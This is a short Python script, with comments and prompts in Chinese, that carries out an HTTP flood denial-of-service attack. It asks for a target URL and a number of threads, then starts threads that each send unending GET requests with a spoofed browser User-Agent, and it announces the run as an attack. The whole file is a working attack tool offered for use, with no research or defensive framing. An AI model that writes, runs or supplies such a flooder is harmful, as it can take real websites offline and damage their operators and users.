import requests
import threading
import time  # 确保引入 time 模块


# 发送 HTTP 请求
def http_flood(url, thread_id):
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    try:
        while True:
            response = requests.get(url, headers=headers)
            print(f"[线程 {thread_id}] 发送 HTTP 请求，响应状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[线程 {thread_id}] 请求错误: {e}")


# 验证 URL 是否包含协议
def validate_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        print("检测到 URL 缺少协议，自动补全为 https://")
        url = "https://" + url
    return url


# 获取用户输入并验证
def get_user_input():
    while True:
        url = input("请输入目标 URL    : ").strip()
        url = validate_url(url)

        try:
            requests.get(url, timeout=5)  # 测试 URL 是否有效
            print("目标 URL 验证成功！")
            break
        except requests.exceptions.RequestException as e:
            print(f"URL 验证失败: {e}，请重新输入。")

    while True:
        try:
            threads = int(input("请输入线程数      : ").strip())
            if threads > 0:
                break
            else:
                print("线程数必须是大于 0 的整数，请重新输入。")
        except ValueError:
            print("无效输入，线程数必须是整数，请重新输入。")

    return url, threads


# 启动 HTTP Flood 攻击
def start_http_flood():
    url, threads = get_user_input()

    print(f"开始 HTTP Flood 攻击，目标 URL: {url}，线程数: {threads}")
    for i in range(threads):
        threading.Thread(target=http_flood, args=(url, i + 1), daemon=True).start()

    # 保持主线程运行，防止程序退出
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n攻击已停止。")
            break


if __name__ == "__main__":
    start_http_flood()
